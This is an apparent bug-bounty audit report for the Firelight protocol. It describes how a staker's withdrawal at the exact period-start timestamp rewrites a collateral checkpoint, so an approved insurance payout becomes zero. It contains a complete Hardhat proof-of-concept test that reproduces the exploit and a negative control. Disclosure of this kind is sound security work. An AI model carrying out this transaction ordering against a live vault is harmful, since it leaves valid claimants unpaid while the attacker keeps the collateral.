# 90429 sc high a period start withdrawal can remove collateral already committed to cover causing a zero vault payout on a valid claim

**Submitted on Aug 24th 2026 at 23:23:29 UTC by @dxhod for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #90429
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief / Intro

I found a time-of-check/time-of-use issue between `CoverOrderAllocator` and `FirelightVault`. At the exact start of a period, the allocator can commit cover capacity using the vault collateral visible at `totalAssetsAt(periodStart)`. A public staker can then withdraw later in the same block. That withdrawal writes the lower post-withdrawal balance at the same period-start timestamp, so later calls to `totalAssetsAt(periodStart)` return a different value from the one used for the commitment. The committed cover can still be settled, but a valid incident payout can be reduced to zero while the staker's withdrawal remains claimable.

## Vulnerability Details

`CoverOrderAllocator.commitAllocation()` calculates capacity from:

`vault.totalAssetsAt(vault.currentPeriodStart())`

The result is consumed and stored in the allocation commitment, but the underlying period-start lookup result is not frozen.

The problematic ordering is:

1. Before the first transaction at the new boundary writes a vault trace, `totalAssetsAt(periodStart)` resolves to the latest earlier checkpoint. In the PoC this is `100`.
2. The operator performs a normal, valid `commitAllocation()` in a block whose timestamp equals `periodStart`, committing capacity based on that `100`.
3. A staker orders a normal public `withdraw()` after the commitment in the same block.
4. `withdraw()` moves the collateral into the delayed-withdrawal bucket and `_logTrace()` writes the lower active balance at `block.timestamp`, which is exactly `periodStart`. In the PoC this makes future `totalAssetsAt(periodStart)` calls return `0`.
5. The commitment is neither invalidated nor recomputed. Its Merkle allocation can still be settled and the cover NFT can still be minted.
6. When a legitimate loss is later approved, `FirelightVault.payout()` re-reads `totalAssetsAt(capturePeriodStart)` instead of using the exposure already committed by the allocator.
7. `IncidentManager` records the actual zero vault payment and closes the incident. The withdrawal bucket is untouched, so the staker can claim the collateral after the delay.

The operator, allocator, assessor, and approver do not need to behave maliciously or incorrectly. Their transactions are the ordinary Firelight workflow. The adversarial action is the public staker's withdrawal and transaction ordering at the boundary.

## Why the exact boundary matters

The PoC includes a negative control with the same withdrawal at `periodStart + 1`. In that case the new checkpoint is after the queried boundary, `totalAssetsAt(periodStart)` remains `100`, the vault pays/slashes the full `100`, and the withdrawal bucket is reduced to zero. Changing only one second changes the result from a full payout to a zero payout.

I also checked the live Phase 1 period schedule read-only. Four of the five most recent 86,400-second boundaries had a block timestamp exactly equal to the period start. Those exact-boundary blocks contained 32, 39, 26, and 26 transactions. I did not send any mainnet or testnet transaction.

## Impact Details

This creates a real solvency shortfall: cover is sold using collateral that the payout path later treats as absent, while the withdrawing staker keeps that collateral.

In the reproducible test:

* vault collateral used for the commitment: `100`
* committed and settled cover: `100`
* `totalAssetsAt(periodStart)` after the boundary withdrawal: `0`
* collateral left in the staker's delayed-withdrawal bucket: `100`
* approved vault payout request: `100`
* actual vault payout: `0`
* final incident status: `CLOSED`
* amount later claimed by the staker: `100`

The economic shortfall is bounded by the minimum of the withdrawn collateral, settled cover, and approved loss. This is not guaranteed instant arbitrage because a covered incident must later occur, but when it does, the collateral already counted to sell the cover is no longer available to satisfy the claim.

## Scope and source identity

The report is against the frozen Phase 2 source at commit `42f9ea5e43d88b35197b901acc2a8c24b314fa62` (tree `6c38527edd6f8d28b4b8fce5c5cdbad331c86124`). The vault, allocator, IncidentManager, checkpoint library, and V2 upgrade/storage context are all listed in scope.

Phase 2 is an intended upgrade and is not deployed, so I am not claiming deployed V2 bytecode parity. I separately validated the supplied legacy-to-V2 upgrade with OpenZeppelin's storage-layout checks and confirmed that collateral, total supply, staker shares, current period, and period configuration are preserved. The complete repository suite passes with the added tests (`451 passing`).

## Recommended Fix

Store the vault exposure used when the allocation is committed and use that same value during payout. Alternatively, invalidate or recompute the commitment if a withdrawal changes that exposure before settlement.

## References

* `CoverOrderAllocator.commitAllocation()`: <https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L332-L403>
* capacity snapshot: <https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L696-L714>
* checkpoint write/lookup implementation: <https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L193-L224>
* `FirelightVault.withdraw()` / `redeem()`: <https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L717-L775>
* `FirelightVault.payout()`: <https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L892-L927>
* `_logTrace()`: <https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1044-L1055>
* incident close path: <https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/IncidentManager.sol#L403-L438>

## Proof of Concept

## Proof of Concept

I added the following test to the frozen competition repository. It uses the actual scoped `FirelightVault`, `CoverOrderAllocator`, `CoverNFT`, `IncidentManager`, and checkpoint implementation; none of the vulnerable logic is replaced with a simplified model.

The first case executes the complete commitment -> boundary withdrawal -> settlement -> approved incident -> zero payout -> later withdrawal claim flow. The second case changes only the withdrawal timestamp to `periodStart + 1` and proves that the full collateral is then paid/slashed.

### Setup

```bash
git clone https://github.com/immunefi-team/audit-comp-firelight.git
cd audit-comp-firelight
git checkout 42f9ea5e43d88b35197b901acc2a8c24b314fa62
npm install
```

Save the code below as `test/sca_period_start_checkpoint_poc.js`, then run:

```bash
npx hardhat test test/sca_period_start_checkpoint_poc.js
```

### PoC test

```javascript
const { expect } = require('chai')
const { ethers, network, upgrades } = require('hardhat')
const { StandardMerkleTree } = require('@openzeppelin/merkle-tree')

const { deployVault } = require('./setup/fixtures.js')

describe('SCA PoC: period-start checkpoint can be rewritten after capacity commit', function () {
  const INCIDENT_STATUS_CLOSED = 4n

  async function deployScenario() {
    const ctx = await deployVault({
      decimals: 0,
      initial_deposit_limit: 200n,
      period_configuration_duration: 24 * 60 * 60,
    })

    const [deployer] = await ethers.getSigners()
    const staker = ctx.users[0]
    const market = {
      chainId: 1,
      protocol: 'SCA',
      market: ethers.encodeBytes32String('period-start'),
    }
    const marketId = ethers.keccak256(
      ethers.AbiCoder.defaultAbiCoder().encode(
        ['uint64', 'string', 'bytes32'],
        [market.chainId, market.protocol, market.market],
      ),
    )

    const CoverNFT = await ethers.getContractFactory('CoverNFT')
    const coverNFT = await upgrades.deployProxy(
      CoverNFT,
      ['Firelight Cover', 'FLCOVER', '', deployer.address, ethers.ZeroAddress, ethers.ZeroAddress, ethers.ZeroAddress],
      { kind: 'transparent' },
    )

    const MockAggregator = await ethers.getContractFactory('MockAggregatorV3')
    const priceFeed = await MockAggregator.deploy(18, 10n ** 18n)

    const Allocator = await ethers.getContractFactory('CoverOrderAllocator')
    const allocator = await upgrades.deployProxy(
      Allocator,
      [{
        vault: ctx.firelight_vault.target,
        premiumCollector: ctx.payout_signer.address,
        coverNFT: coverNFT.target,
        priceFeedAdapter: priceFeed.target,
        maxPriceAge: 7 * 24 * 60 * 60,
        premiumTokens: [ctx.token_contract.target],
        admin: deployer.address,
        adminRole: deployer.address,
        curatorRole: deployer.address,
        allocatorRole: deployer.address,
        configAdminRole: deployer.address,
        initialProtocolConcentrations: [{
          chainId: market.chainId,
          protocol: market.protocol,
          maxProtocolConcentrationBps: 10_000,
        }],
        newMarkets: [market],
        capacityConfig: {
          minCAR: 12_000,
          firstLossBufferToken: ctx.token_contract.target,
          firstLossBuffer: ctx.payout_receiver.address,
          effectiveLeverage: 12_000,
          minOrderMarketCoverAmount: 1,
          divergenceToleranceBps: 0,
        },
      }],
      { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] },
    )

    await coverNFT.grantRole(await coverNFT.MINTER_ROLE(), allocator.target)

    const vaultAssets = 100n
    const canonicalCover = vaultAssets * 10n ** 18n
    await ctx.utils.mintAndApprove(vaultAssets + 10n, staker)
    await ctx.firelight_vault.connect(staker).deposit(vaultAssets, staker.address)
    await ctx.token_contract.connect(staker).approve(allocator.target, 10n)

    await allocator.createCoverOrder(
      staker.address,
      staker.address,
      'sca-beneficiary',
      ctx.token_contract.target,
      [{ marketId, coverRateAnnual: 500, coverAmount: canonicalCover }],
      0,
    )

    const allocation = [[marketId, canonicalCover]]
    const tree = StandardMerkleTree.of([[0n, allocation]], ['uint256', '(bytes32,uint256)[]'])
    const periodStart = await ctx.firelight_vault.currentPeriodEnd()

    return {
      ctx,
      deployer,
      staker,
      marketId,
      allocator,
      priceFeed,
      vaultAssets,
      canonicalCover,
      tree,
      periodStart,
    }
  }

  async function settleCover(scenario) {
    const { allocator, marketId, canonicalCover, tree } = scenario
    await allocator.settleCoverOrder(
      0,
      [{ marketId, allocatedCover: canonicalCover }],
      tree.getProof(0),
    )
    expect((await allocator.getCoverOrder(0)).allocatedCoverAmount).to.equal(canonicalCover)
  }

  async function closeIncident(scenario, expectedVaultPaid) {
    const {
      ctx,
      deployer,
      marketId,
      allocator,
      priceFeed,
      vaultAssets,
      canonicalCover,
      periodStart,
    } = scenario

    const IncidentManager = await ethers.getContractFactory('IncidentManager')
    const incidentManager = await upgrades.deployProxy(
      IncidentManager,
      [
        deployer.address,
        deployer.address,
        deployer.address,
        deployer.address,
        deployer.address,
        deployer.address,
        deployer.address,
        deployer.address,
        ctx.payout_receiver.address,
        allocator.target,
        priceFeed.target,
        7 * 24 * 60 * 60,
      ],
      { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] },
    )
    await ctx.firelight_vault.grantRole(await ctx.firelight_vault.PAYOUT_ROLE(), incidentManager.target)
    await ctx.firelight_vault.grantRole(await ctx.firelight_vault.INCIDENT_ROLE(), incidentManager.target)

    await incidentManager.createIncident(
      periodStart,
      'SCA period-start checkpoint incident',
      ethers.keccak256(ethers.toUtf8Bytes('sca-period-start-checkpoint')),
    )
    await incidentManager.confirmIncident(1, 'ipfs://sca-reproducer')
    await incidentManager.addAssessmentLosses(1, [{ coverTokenId: 0, marketId, amount: canonicalCover }])
    await incidentManager.submitCurrentAssessment(1)

    const approval = incidentManager.approveCurrentAssessment(1)
    await expect(approval)
      .to.emit(incidentManager, 'IncidentPayoutExecuted')
      .withArgs(
        1,
        1,
        1,
        1,
        ctx.payout_receiver.address,
        ctx.payout_receiver.address,
        ctx.token_contract.target,
        0,
        canonicalCover,
        vaultAssets,
        expectedVaultPaid,
      )
      .and.to.emit(incidentManager, 'IncidentClosed')
      .withArgs(1, expectedVaultPaid, canonicalCover)

    const [incident, exists] = await incidentManager.getIncident(1)
    expect(exists).to.equal(true)
    expect(incident.status).to.equal(INCIDENT_STATUS_CLOSED)
    expect(incident.vaultPaidAmount).to.equal(expectedVaultPaid)

    return incidentManager
  }

  it('settles committed cover, pays zero, closes the incident, and leaves the withdrawal claim intact', async function () {
    const scenario = await deployScenario()
    const { ctx, staker, allocator, vaultAssets, canonicalCover, tree, periodStart } = scenario

    // Both transactions execute in the first block of the new period. The permissioned
    // allocator commits first; the public staker back-runs it and rewrites the checkpoint
    // at the exact same timestamp used as the period-start snapshot.
    await network.provider.send('evm_setAutomine', [false])
    let commitTx
    let withdrawTx
    try {
      await network.provider.send('evm_setNextBlockTimestamp', [Number(periodStart)])
      commitTx = await allocator.commitAllocation(1, tree.root, canonicalCover, canonicalCover, { gasLimit: 5_000_000 })
      withdrawTx = await ctx.firelight_vault
        .connect(staker)
        .withdraw(vaultAssets, staker.address, staker.address, { gasLimit: 5_000_000 })
      await network.provider.send('evm_mine')
      await commitTx.wait()
      await withdrawTx.wait()
    } finally {
      await network.provider.send('evm_setAutomine', [true])
    }

    const commitment = await allocator.getAllocationCommitment(1)
    expect(commitment.totalAvailableCapacity).to.equal(canonicalCover)
    expect(await ctx.firelight_vault.totalAssetsAt(periodStart)).to.equal(0n)
    expect(await ctx.firelight_vault.withdrawAssets(2)).to.equal(vaultAssets)

    await settleCover(scenario)
    await closeIncident(scenario, 0n)

    // The supposedly exposed withdrawal bucket is untouched and becomes fully claimable.
    expect(await ctx.firelight_vault.withdrawAssets(2)).to.equal(vaultAssets)
    await network.provider.send('evm_setNextBlockTimestamp', [Number(periodStart + 2n * 24n * 60n * 60n)])
    await network.provider.send('evm_mine')
    await expect(ctx.firelight_vault.connect(staker).claimWithdraw(2))
      .to.emit(ctx.firelight_vault, 'CompleteWithdraw')
      .withArgs(staker.address, vaultAssets, 2)
  })

  it('negative control: a withdrawal one second later preserves the committed cap and is slashed', async function () {
    const scenario = await deployScenario()
    const { ctx, staker, allocator, vaultAssets, canonicalCover, tree, periodStart } = scenario

    await network.provider.send('evm_setNextBlockTimestamp', [Number(periodStart)])
    await allocator.commitAllocation(1, tree.root, canonicalCover, canonicalCover)

    await network.provider.send('evm_setNextBlockTimestamp', [Number(periodStart + 1n)])
    await ctx.firelight_vault.connect(staker).withdraw(vaultAssets, staker.address, staker.address)

    expect((await allocator.getAllocationCommitment(1)).totalAvailableCapacity).to.equal(canonicalCover)
    expect(await ctx.firelight_vault.totalAssetsAt(periodStart)).to.equal(vaultAssets)
    expect(await ctx.firelight_vault.withdrawAssets(2)).to.equal(vaultAssets)

    await settleCover(scenario)
    await closeIncident(scenario, vaultAssets)

    expect(await ctx.firelight_vault.withdrawAssets(2)).to.equal(0n)
    expect(await ctx.token_contract.balanceOf(ctx.payout_receiver.address)).to.equal(vaultAssets)
  })
})
```

Expected output:

```
SCA PoC: period-start checkpoint can be rewritten after capacity commit
  passes: settles committed cover, pays zero, closes the incident, and leaves the withdrawal claim intact
  passes: negative control: a withdrawal one second later preserves the committed cap and is slashed

2 passing
```

The positive case asserts all material state changes: committed capacity `100e18`, future `totalAssetsAt(periodStart) == 0`, delayed-withdrawal bucket `100`, approved vault request `100`, actual vault payment `0`, incident `CLOSED`, and later claim of `100`.

The negative control changes only the timestamp to `periodStart + 1`. It asserts `totalAssetsAt(periodStart) == 100`, actual vault payment `100`, and withdrawal bucket `0`.

I also ran an OpenZeppelin `upgradeProxy` layout/state test from the repository-supplied legacy vault to the frozen V2 implementation. It preserves collateral, total supply, staker balance, current period, and period configuration. This upgrade test is supporting source-context evidence; the exploit reproduction above is self-contained.
